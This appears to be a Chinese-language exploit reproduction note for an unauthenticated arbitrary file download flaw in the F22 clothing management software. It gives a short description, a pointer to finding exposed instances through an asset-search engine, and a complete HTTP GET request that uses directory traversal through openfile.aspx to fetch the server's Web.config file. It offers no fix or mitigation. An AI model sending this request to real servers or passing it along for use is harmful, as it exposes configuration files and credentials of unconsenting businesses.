# 广州锦铭泰软件科技有限公司F22服装管理软件系统openfile.aspx前台任意文件下载

# 一、漏洞简介
广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在接口未授权访问，通过未授权的口/oa/isprit/module/openfile.aspx存在任意文件下载漏洞。攻击者最终可利用该漏洞获取敏感信息。

# 二、影响版本
+ F22服装管理软件系统

# 三、资产测绘
+ hunter
+ 特征

![1701097856863-836b585b-5ad5-4a30-9d15-de84e9bb5567.png](./img/F6ehaHwmiT2nLKU9/1701097856863-836b585b-5ad5-4a30-9d15-de84e9bb5567-711181.png)

# 四、漏洞复现
```plain
GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1701097898821-70329903-417e-40d4-b245-8c141fdfe265.png](./img/F6ehaHwmiT2nLKU9/1701097898821-70329903-417e-40d4-b245-8c141fdfe265-689811.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ghu980augeuitr7e>